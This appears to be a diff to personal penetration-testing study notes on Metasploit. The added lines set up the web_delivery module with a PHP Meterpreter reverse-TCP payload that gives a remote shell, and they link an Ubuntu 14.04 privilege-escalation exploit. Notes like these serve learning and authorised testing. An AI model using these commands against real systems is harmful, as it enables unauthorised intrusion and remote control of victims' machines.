@@ -58,6 +58,30 @@ db_import /tmp/nessus_report_Host_101
 vnc_none_auth - this will scan for VNC server configured without a password (rare as modern VNC servers require password for installation). Possible RealVNC4.1.1
 open_x11 - this searches a range of hosts for X11 servers that allow connection without authentication
 
+* Modules
+** Web Delivery
+URL: https://www.offensive-security.com/metasploit-unleashed/web-delivery/
+Metasploit’s Web Delivery Script is a versatile module that creates a server on the attacking machine which hosts a payload. When the victim connects to the attacking server, the payload will be executed on the victim machine.
+
+Type of App: Python PHP PowerShell
+
+Example:
+#+BEGIN_SRC sh
+Msfconsole
+use exploit/multi/script/web_delivery
+msf exploit (web_delivery)>set target 1
+msf exploit (web_delivery)>set payload php/meterpreter/reverse_tcp
+msf exploit (web_delivery)>set lhost 192.168.1.15 (IP of Local Host)
+msf exploit (web_delivery)>set lport 4444
+msf exploit (web_delivery)>set svrport 8081
+msf exploit (web_delivery)>exploit
+#+END_SRC
+This will start a service running on 4444 and provide a php one liner to be executed on the target machine
+
+** 39166.c
+URL: https://vulners.com/exploitdb/EDB-ID:39166
+This exploit is specific for Ubuntu 14.04, and drops the attaker into a shell
+
 * Lecture
 ** [[https://www.youtube.com/watch?v%3DadSQyRPpiBw][Getting Started with Meatasploit - Nathan Sweaney]]
 + Command Line Access
